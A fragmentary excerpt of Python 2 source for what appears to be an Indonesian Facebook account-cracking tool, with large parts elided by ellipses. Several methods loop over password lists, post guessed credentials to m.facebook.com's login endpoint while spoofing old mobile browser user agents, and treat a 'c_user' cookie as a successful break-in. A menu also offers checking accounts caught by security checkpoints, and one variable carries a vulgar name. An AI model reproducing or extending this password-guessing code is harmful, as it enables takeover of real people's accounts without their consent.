...
def moch_yayan():
    ...
    print '%s╠══[10]%s Cek opsi checkpoin%s'%(O,N,O,N);time.sleep(0.04)
...
def mengecek(user, pw):
	...
	if "c_user" in ses.cookies:
		...
		run = ("https://m.facebook.com/settings/apps/tabbed/?tab=active")
    ...
    def __api__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            try:
            	...
            	_kontol = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba;]'
            ses = requests.Session()
    ...
    def __api__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            try:
            	...
            	_kontol = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            try:
            	...
            	_kontol = 'Mozilla/5.0 (Linux; Android 5.0.2; SM-G530H Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36;]'
            ses = requests.Session()
